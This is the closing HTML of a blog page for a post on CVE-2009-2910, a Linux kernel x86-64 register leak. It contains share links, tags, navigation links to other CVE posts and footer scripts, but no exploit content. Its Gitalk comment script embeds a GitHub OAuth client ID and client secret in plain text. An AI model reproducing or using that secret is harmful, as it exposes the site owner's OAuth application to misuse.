                                                                    <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://lzxzl.github.io/post/cve-2009-2910-linux-kernel-x86-64-register-leak-by-jon-oberheide/&sharesource=qzone&title=CVE-2009-2910-Linux Kernel x86-64 Register Leak by Jon Oberheide&pics=https://lzxzl.github.io/images/avatar.png?v=1747748455692&summary="><i class="fa fa-qq"></i></a>
                                                                    <a title="新浪微博" target="_blank" href="https://service.weibo.com/share/share.php?url=https://lzxzl.github.io/post/cve-2009-2910-linux-kernel-x86-64-register-leak-by-jon-oberheide/&sharesource=weibo&title=CVE-2009-2910-Linux Kernel x86-64 Register Leak by Jon Oberheide + " - " + &pic="https://lzxzl.github.io/images/avatar.png?v=1747748455692 "><i class="fa fa-weibo "></i></a>

                                                                    </span>
                                                                    
                                                                            <!--zh-->
                                                                            <section class="post-tags zh ">
                                                                                <div>
                                                                                    <span>&#x6807;&#x7B7E;:</span>
                                                                                    <span class="tag ">
                        
                        
                        <a href="https://lzxzl.github.io/tag/XOAss1DVS/">#
                    info-leak
                        </a>
                        
                        <a href="https://lzxzl.github.io/tag/LlmtM56SL/">#
                    linux kernel exploit
                        </a>
                        
                            
                                </span>
                                                                                </div>
                                                                                <div>
                                                                                    <a href="javascript:window.history.back();">
                        &#x8FD4;&#x56DE;</a>
                                                                                    <span>&dot;</span>
                                                                                    <a href="#">&#x4E3B;&#x9875;</a>
                                                                                </div>
                                                                            </section>

                                                                            
                                                                                <!---->
                                                                                <section class="post-nav">
                                                                                    
                                                                                        <a class="prev" rel="prev" href="https://lzxzl.github.io/post/cve-2021-25458-kernel-null-pointer-dereference-in-exynos-ion-implementation/">
                                                                                            CVE-2021-25458 Kernel NULL Pointer Dereference in Exynos ION Implementation
                                                                                        </a>
                                                                                        
                                                                                            
                                                                                                <a class="next" rel="next" href="https://lzxzl.github.io/post/cve-2009-3001-linux-kernel-getname-stack-memory-disclosures-by-jon-oberheide/">
                                                                                                    CVE-2009-3001 — Linux Kernel getname() Stack Memory Disclosures by Jon Oberheide
                                                                                                </a>
                                                                                                
                                                                                </section>
                    </article>
                </div>
                
                    
                        <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>

<div id="gitalk-container" style="width: 100%;max-width: 780px;margin: auto;"></div>

<script>
    var gitalk = new Gitalk({
        clientID: '2a44a295dd16ae7d05b8',
        clientSecret: '8030257bc11446a193cf383767567daca0e26312',
        repo: 'lzxzl.github.io',
        owner: 'lzxzl',
        admin: ['lzxzl'],
        id: (location.pathname).substring(0, 49), // Ensure uniqueness and length less than 50
        distractionFreeMode: false // Facebook-like distraction free mode
    })

    gitalk.render('gitalk-container')
</script>
                            
                                        
                                            
            </div>
    </div>
    </div>
    </div>
    
        <footer id="footer" class="footer">
            <div class="copyright">
                
                        ztree
                            
                                        <svg viewBox="0 0 1024 1024" style="margin-left: 5px;margin-right: 5px;" version="1.0" width="8" height="8" class="my-face">
            <path
                d="M863.597631 513.574282l-271.33965-140.213484L729.783667 81.926656c3.583731-7.87141 7.167462-15.742819 7.167462-25.214109C736.887134 25.226908 708.345275 0.012799 672.635953 0.012799a63.611229 63.611229 0 0 0-39.293053 12.607055c-1.791866 1.59988-3.519736 3.19976-5.311602 3.19976L147.87531 418.925381a55.547834 55.547834 0 0 0-19.646527 47.356448c1.791866 17.278704 14.27093 33.021523 32.125591 42.492813l271.33965 141.749369L292.504463 945.221908c-12.479064 25.214109-1.791866 53.563983 23.166262 69.306802 10.751194 6.335525 23.230258 9.47129 35.709322 9.47129 16.062795 0 32.125591-4.735645 44.604655-15.742819l480.091993-403.297753a55.547834 55.547834 0 0 0 19.646526-47.228458 61.243407 61.243407 0 0 0-32.12559-44.156688z"
                fill="#93b5cf"></path>
        </svg>
                                        ztree &copy;Copyright
                                            <script>
                                                var date = new Date();
                                                document.write("" + date.getFullYear());
                                            </script>
                                            | Powered by
                                            <a href="https://lzxzl.github.io/" target="_blank">
                                                ztree
                                            </a>
            </div>
            <div id="update" style="display:none;">
                off
            </div>
            
                    <script>
                        var port = '';
                        
                        document.write('<div id="home_path" style="display:none;">' + document.location.protocol + '//' + window.document.location.hostname + port + '</div>')
                    </script>
        </footer>
        
                <script>
                    
                    
                    
                    getStar();
                    hljs.initHighlighting();
                    console.clear();
                    
                    var newDate = new Date();
                    newDate.setTime(1747748455692);
                    console.log(" Blog Update Time: " + newDate.toLocaleDateString());
                    console.log("\n %c \u26a1Theme:Chic Author's Blog:https://blog.itjoker.cn  Write By ITJoker  \n\n", "color: #ffffff; background: rgba(49, 49, 49, 0.85); padding:5px 0;border-radius:5px;");
                </script>
        </div>
</body>
<script>
    scroll();
</script>

</html>